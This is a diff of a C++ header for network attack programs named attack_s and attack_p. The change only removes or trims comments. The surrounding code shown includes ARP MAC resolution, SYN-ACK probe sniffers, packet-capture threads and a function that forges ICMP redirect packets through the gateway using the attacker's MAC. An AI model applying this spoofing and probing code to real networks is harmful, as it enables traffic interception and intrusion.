@@ -52,16 +52,13 @@ struct ProbeResult {
 
 // ------------------------------------------------------------------ helpers --
 
-// Thread-safe cout: each binary (attack_s / attack_p) gets one copy of this
-// mutex since they each compile common.h into a single translation unit.
 static mutex g_log_mtx;
 inline void println(const string& s) {
     lock_guard<mutex> lk(g_log_mtx);
     cout << s << "\n";
 }
 
-// Thread-safe RNG: each thread gets its own engine seeded from random_device.
-// Avoids the data race on rand()'s global state when called from parallel port threads.
+
 inline uint32_t rand32() {
     thread_local mt19937 rng(random_device{}());
     return uniform_int_distribution<uint32_t>{}(rng);
@@ -121,8 +118,7 @@ inline string arp_cache(const string& ip) {
     return "";
 }
 
-// Single-threaded MAC resolution (used for gateway and in attack_s).
-// For attack_p use the inline block resolver in port_worker.
+//  MAC resolution
 inline string resolve_mac(const string& ip, NetworkInterface& iface, PacketSender& sender) {
     string cached = arp_cache(ip);
     if (!cached.empty()) return cached;
@@ -277,8 +273,7 @@ inline SnifferConfiguration sniffer_cfg(const string& filter) {
     return cfg;
 }
 
-// Sniffer is created by caller; caller calls sn.stop_sniff() to terminate.
-// probe_listen returns on first SYN-ACK or c-ACK, or when stop_sniff() fires.
+
 inline void probe_listen(Sniffer& sn, ProbeResult& result, atomic<bool>& stop) {
     while (!stop) {
         unique_ptr<PDU> pdu(sn.next_packet());
@@ -305,7 +300,7 @@ struct BlockProbeResult {
     set<uint16_t>           syn_acks; // ports that received a SYN-ACK
 };
 
-// Sniffer is created by caller with probe_block_filter(); caller calls stop_sniff().
+
 inline BlockProbeResult probe_block(Sniffer& sn, const vector<uint16_t>& ports,
                                     atomic<bool>& stop) {
     set<uint16_t> port_set(ports.begin(), ports.end());
@@ -329,9 +324,6 @@ inline BlockProbeResult probe_block(Sniffer& sn, const vector<uint16_t>& ports,
     return result;
 }
 
-// Spawn a self-contained capture session for one port.
-// Returns immediately; the thread runs for sniff_wait seconds then exits.
-// Captured packets printed to terminal and appended to log file.
 inline thread spawn_capture(const vector<Host>& block, uint16_t port,
                              int sniff_wait, ofstream& log, mutex& log_mtx) {
     return thread([block, port, sniff_wait, &log, &log_mtx]() {
@@ -367,7 +359,7 @@ inline thread spawn_capture(const vector<Host>& block, uint16_t port,
     });
 }
 
-// Spawn a self-contained capture session for multiple ports (used by attack_p).
+
 inline thread spawn_capture_ports(const vector<Host>& block, const vector<uint16_t>& ports,
                                    int sniff_wait, ofstream& log, mutex& log_mtx) {
     return thread([block, ports, sniff_wait, &log, &log_mtx]() {
@@ -408,8 +400,7 @@ inline thread spawn_capture_ports(const vector<Host>& block, const vector<uint16
 
 // Like icmp_redirect() but dst MAC is always gw_mac — no per-client ARP needed.
 // Gateway forwards to each client based on the IP layer dst.
-// Eth src = self_mac (attacker). REDIRECT_SRC_MAC is not used here — gateway
-// drops frames whose src MAC matches its own MAC (loop detection).
+// Eth src = self_mac (attacker). 
 inline void icmp_redirect_gw(const vector<Host>& block, uint16_t port, uint32_t seq,
                               NetworkInterface& iface, PacketSender& sender,
                               const string& self_mac, const string& gw_mac) {
